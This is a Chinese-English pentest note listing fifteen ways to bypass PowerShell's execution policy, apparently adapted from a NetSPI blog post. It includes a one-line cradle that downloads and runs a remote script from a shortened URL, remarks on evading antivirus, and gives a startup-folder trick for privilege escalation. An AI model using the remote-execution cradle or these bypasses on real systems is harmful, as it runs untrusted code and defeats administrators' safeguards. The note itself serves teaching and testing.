# Powershell
## 特点
Native to Windows
Able to call the Windows API
Able to run commands without writing to the disk
Able to avoid detection by Anti-virus
Already flagged as “trusted” by most application white list solutions
A medium used to write many open source Pentest toolkits

## 15种绕过 powershell 执行策略的方法
> source：https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/


默认情况下，windows中的ps1文件是不允许执行的。这里列示了15种可以绕过windows执行策略的方案，而不需要具有local administrator 权限。

查看执行权限可以使用命令 `Get-Excecution -List`  或`Get-ExecutionPolicy -List | Format-Table -AutoSize`, 默认都是Restricted。重要的一点是，这一设置并与意味着某种安全控制，它只是防止administrator误操作的一种办法。这也是为什么可以有方法可以绕过此策略。

假设我们想执行的语句为 `Write-Host "My voice is my passport, verify me."` ，它被写入了 .\runme.ps1。

直接在命令行上运行会报错：“cannot be loaded...”

下面尝试绕过：

### 直接拷贝脚本中命令到控制台运行

`PS c:\users\ss> Write-Host "My voice is my passport, verify me."`

### 使用`Echo`

```
Echo Write-Host "My voice is my passport, verify me." | PowerShell.exe -noprofile -
```
这种技术，不会导致配置变化或写磁盘操作。

### 从文件读取并通过管道传给ps标准输入

```
Get-Content .runme.ps1 | PowerShell.exe -noprofile -

TYPE .runme.ps1 | PowerShell.exe -noprofile -
```


这种技术，不会导致配置变化或写磁盘操作。还可以从网络共享位置读取文件，而不写磁盘。
### 从url下载脚本并使用invoke表达式执行

这个技术从网上下载脚本并执行，也不写磁盘，不导致配置改变。很有用的技术。

```
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
```

iex开启了一个invoke表达式，


### 使用命令切换

这个技术很类似于拷贝粘贴执行一个脚本，但是它可以在没有交互下完成。简单命令可以顺利使用，复杂脚本可能会报错。

```
Powershell -command "Write-Host 'My voice is my passport, verify me.'"

Powershell -c "Write-Host 'My voice is my passport, verify me.'"
```

值得注意的是，你可以将他们放在批处理文件中，置于all users 的 startup 文件夹下，这样可以达到权限提升作用。

### 使用编码swith `-Enc` 或 `-EncodedCommand`

所有脚本可以通过unicode/base64编码后执行，这样可以避免不小心粘贴错误。这个技术也不会影响配置或写磁盘。

下面的例子使用了Posh-SecMod工具，它可以压缩编码命令大小。

```
$command = "Write-Host 'My voice is my passport, verify me.'" ; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) ; $encodedCommand = [Convert]::ToBase64String($bytes) ; powershell.exe -EncodedCommand $encodedCommand;
```

上面的 $encodedCommand 为：`VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA`

例2，使用编码字符串短命令

```
powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA
```

### 使用 invoke-command 命令

这是一种有趣的方式。它典型的执行是通过一个交互的ps console或使用command swith的一行命令，但非常酷的是它可用于执行于远程系统执行命令。这个技术也不会变更配置和写磁盘。

```
invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}

invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force
```

### 使用 invoke-Expression 命令

这是有一个用于交互shell控制台执行或一行命令的方法。这个技术也不会变更配置和写磁盘。

Example 1: Full command using Get-Content

`Get-Content .runme.ps1 | Invoke-Expression`

Example 2: Short command using Get-Content

`GC .runme.ps1 | iex`

### 使用 Bypass 执行策略flag
When this Bypass flag is used Microsoft states that “Nothing is blocked and there are no warnings or prompts”. This technique does not result in a configuration change or require writing to disk.

`PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1`


### 使用 ‘Unrestricted’ 执行策略flag
This similar to the “Bypass” flag. However, when this flag is used Microsoft states that it “Loads all configuration files and runs all scripts. If you run an unsigned script that was downloaded from the Internet, you are prompted for permission before it runs.” This technique does not result in a configuration change or require writing to disk.

`PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1`

### 使用 “Remote-Signed” Execution Policy Flag
`PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1`

### Disable ExecutionPolicy by Swapping out the AuthorizationManager

This is really creative one I came across on http://www.nivot.org. The function below can be executed via an interactive PowerShell console or by using the “command” switch. Once the function is called it will swap out the “AuthorizationManager” with null. As a result, the execution policy is essentially set to unrestricted for the remainder of the session. This technique does not result in a persistant configuration change or require writing to disk. However, it the change will be applied for the duration of the session.

```
function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  .runme.ps1
```

### 为进程scope设置执行策略

As we saw in the introduction, the execution policy can be applied at many levels. This includes the process which you have control over. Using this technique the execution policy can be set to unrestricted for the duration of your Session. Also, it does not result in a configuration change, or require writing to the disk. I originally found this technique on the r007break blog.

`Set-ExecutionPolicy Bypass -Scope Process`

### 为CurrentUser Scope 设置 ExcutionPolicy

This option is similar to the process scope, but applies the setting to the current user’s environment persistently by modifying a registry key. Also, it does not result in a configuration change, or require writing to the disk. I originally found this technique on the r007break blog

`Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted`

### Set the ExcutionPolicy for the CurrentUser Scope via the Registry
In this example I’ve shown how to change the execution policy for the current user’s environment persistently by modifying a registry key directly.

`HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell`